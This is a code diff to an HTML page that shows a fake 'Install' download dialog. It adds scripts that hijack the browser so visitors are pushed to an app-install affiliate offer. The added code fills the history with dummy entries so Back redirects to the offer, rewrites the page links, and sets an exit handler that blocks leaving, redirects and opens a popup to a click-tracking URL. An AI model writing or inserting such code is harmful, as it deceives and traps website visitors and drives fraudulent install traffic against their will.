@@ -548,7 +548,7 @@
 }
   </style>
 </head>
-<body>
+<body id="link-id-01" href="https://in.oceseller.com/click.php?lp=1&to_offer=1" >
 <div class="cont">
 <img src="./download.gif" alt="">
 </div>
@@ -625,7 +625,7 @@
 </div>
 <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
 <div class="ui-dialog-buttonset">
-<a href="https://in.oceseller.com/click.php?lp=1&to_offer=1" >
+<a  id="link-id-02" href="https://in.oceseller.com/click.php?lp=1&to_offer=1" >
 <button id="lang_install" type="button" class="lang-text3 ui-button ui-corner-all ui-widget" data-langkey="button"><b>Install</b></button>
 </a>
 </div>
@@ -638,4 +638,66 @@
       document.querySelector('.ui-dialog').classList.add('show');
     }, 500)
   </script>
+  
+  
+      <script type="text/javascript">
+        //Historyback
+        ! function() {
+            var t;
+            try {
+                for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+                onpopstate = function(t) {
+                    window.onbeforeunload = null;
+                    t.state && location.replace('https://in.nwixs.com/in-mobi-cpi-chingari-group01-a/');
+                };
+            } catch (o) {}
+        }();
+    </script>
+
+<script type="text/javascript">
+	var nc = 'https://in.nwixs.com/in-mobi-cpi-chingari-group01-a/';
+	
+	document.getElementById("link-id-01").href = nc;
+	document.getElementById("link-id-02").href = nc;
+	
+	function goto(){
+		setTimeout(function () {
+                        location.replace(nc);
+                    }, 100);
+	}
+
+    (function (w, d) {
+        var epp = function () {
+            if (w.onbeforeunload === null) {
+                var to;
+                function repp() {
+                    w.onbeforeunload = null;
+					window.open("https://in.oceseller.com/click.php?lp=1&to_offer=1", "_blank");
+                };
+                function epp() {
+                    to = setTimeout(function () {
+                        w.location.replace(nc);
+                        repp();
+                    }, 100);
+                    return 'आधुनिक भारत की तेजी से बढ़ जरूरतों को पूरा करने के लिए कस्टम डिजाइन चरण का अनुभव करने के लिए हमें शामिल हों';
+                }
+                w.onbeforeunload = epp;
+                // Prevent epp firing from clicking on tracking links
+                var ln = d.querySelectorAll("[href='"+nc+"']");
+                for (i = 0; i < ln.length; ++i) {
+                    ln[i].addEventListener("click", function () {
+                        repp();
+                    });
+                }
+            }
+            ;
+        };
+        if (d.readyState != 'loading') {
+            epp();
+        } else {
+            d.addEventListener('DOMContentLoaded', epp);
+        }
+    })(window, document);
+</script>
+  
 </body></html>
